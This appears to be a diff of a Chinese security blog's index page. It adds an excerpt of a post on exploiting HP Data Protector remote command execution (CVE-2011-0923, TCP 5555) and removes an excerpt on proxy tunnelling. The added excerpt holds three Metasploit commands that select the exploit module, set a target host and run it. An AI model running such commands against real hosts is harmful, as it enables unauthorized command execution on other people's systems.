@@ -195,6 +195,90 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">HP Data Protector漏洞利用记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-09-03 17:38:54" itemprop="dateCreated datePublished" datetime="2019-09-03T17:38:54+08:00">2019-09-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-26 15:55:37" itemprop="dateModified" datetime="2020-08-26T15:55:37+08:00">2020-08-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="HP-Data-Protector远程命令执行（CVE-2011-0923）"><a href="#HP-Data-Protector远程命令执行（CVE-2011-0923）" class="headerlink" title="HP Data Protector远程命令执行（CVE-2011-0923）"></a>HP Data Protector远程命令执行（CVE-2011-0923）</h3><p>HP Data Protector存在一个命令执行漏洞，恶意用户可以发送数据包导致这种特殊的服务来执行任意shell命令。这个漏洞在内网中很常见，端口为TCP<code>5555</code>，基本上一打一个准，这里说下利用过程，以作记录。</p>
+<h3 id="正常利用过程"><a href="#正常利用过程" class="headerlink" title="正常利用过程"></a>正常利用过程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-40-26.png"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -933,88 +1017,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="r0yanx">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="r0yanx's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/" class="post-title-link" itemprop="url">浅谈代理隧道的几种应用场景</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-07-08 15:55:02" itemprop="dateCreated datePublished" datetime="2019-07-08T15:55:02+08:00">2019-07-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-26 15:51:20" itemprop="dateModified" datetime="2020-08-26T15:51:20+08:00">2020-08-26</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>熟练的代理转发，既可助你穿梭内网，亦可在工作生活中提供便利。理论上，任何接入互联网的计算机都是可访问的，但是如果目标主机处于内网，而我们又想和该目标主机进行通信的话，就需要借助一些端口转发工具来达到我们的目的。</p>
-<h3 id="二、端口转发"><a href="#二、端口转发" class="headerlink" title="二、端口转发"></a>二、端口转发</h3><p>把端口接收到的流量转发到另外一个端口，可以是本机的端口，也可以是其它网络的端口。<br>实现原理：基于传输层协议，把socket字节流原封不动进行转发。<br>弊端：如果上层协议有校验，会出错。比如<code>HTTP协议</code>中部分WEB服务会校验host头，导致HTTP连接中断。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1086,7 +1088,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
